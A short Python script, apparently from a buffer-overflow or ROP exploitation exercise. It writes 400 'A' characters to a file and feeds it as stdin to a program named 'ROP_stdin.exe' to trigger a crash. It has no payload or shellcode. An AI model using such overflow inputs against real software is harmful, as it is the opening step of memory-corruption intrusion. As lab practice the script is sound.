import os
import struct

input = "A" * 400

f = open("out", "w")
f.write(input)
f.close()

os.system("ROP_stdin.exe 1 < out")